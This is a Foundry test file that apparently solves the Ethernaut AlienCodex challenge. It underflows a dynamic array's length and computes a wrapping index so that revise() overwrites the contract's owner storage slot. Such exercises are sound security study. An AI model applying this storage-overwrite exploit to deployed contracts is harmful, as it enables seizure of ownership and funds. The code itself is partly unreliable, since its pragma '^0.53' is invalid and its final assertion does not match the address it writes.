// SPDX-License-Identifier: MIT
pragma solidity ^0.53;

import {Test} from "forge-std/Test.sol";
import {AlienCodex} from "../src/AlienCodex.sol";
import {console} from "forge-std/console.sol";

contract AlienCodexTest is Test {
    AlienCodex alienCodex;

    address attaker = makeAddr("attaker");

    function setUp() public {
        alienCodex = new AlienCodex();
    }

    function testOwnership() public {
        (uint256 slotOwner, uint256 slotContact, uint256 slotCodex) = alienCodex.getSlots();
        console.log("ADDRESS", address(this));
        console.log("ATTACKER", attaker);
        console.log("--------------------------------");
        console.log("slotOwner", slotOwner);
        console.log("slotContact", slotContact);
        console.log("slotCodex", slotCodex);
        console.log("--------------------------------");
        console.log("ownerData", alienCodex.getOwnerData());
        console.log("contactData", alienCodex.getContactData());
        console.log("--------------------------------");

        // Compute arr pinter: p = keccak256(abi.encodePacked(uint256(1)))
        bytes32 attackerBytes = 0x00000000000000000000000060a712D6C3bC7FE575958A39bD3BaF0DEcc79113;
        uint256 p = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 index = type(uint256).max - p + 1;

        alienCodex.makeContact();
        alienCodex.retract(); // the length becomes equal to 2**256 − 1
        alienCodex.revise(index, attackerBytes);
        assertEq(alienCodex.owner(), address(this));
    }
}
